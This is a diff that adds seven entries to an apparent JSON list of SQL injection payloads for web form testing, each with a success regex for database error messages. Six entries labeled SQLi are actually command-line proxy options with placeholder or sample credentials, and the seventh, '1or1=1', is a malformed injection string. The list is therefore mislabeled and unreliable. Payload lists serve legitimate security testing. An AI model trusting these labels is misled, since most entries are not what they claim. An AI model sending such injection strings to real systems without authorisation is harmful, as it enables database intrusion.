@@ -2506,5 +2506,82 @@
       "expected_status_code": 200,
       "success_regex": "error|sql|syntax"
     }
+  },
+  {
+    "payload_id": "OWP-243796",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "--proxy=\"http://[username]:[password]@[proxy_ip]:[proxy_port]\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-243797",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "--proxy=\"http://user:pass@127.0.0.1:8080\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-243798",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "--proxy=\"socks4://[username]:[password]@[proxy_ip]:[proxy_port]\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-243799",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "--proxy=\"socks4://user:pass@127.0.0.1:1080\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-243800",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "--proxy=\"socks5://[username]:[password]@[proxy_ip]:[proxy_port]\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-243801",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "--proxy=\"socks5://user:pass@127.0.0.1:1080\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-399017",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "1or1=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
   }
 ]
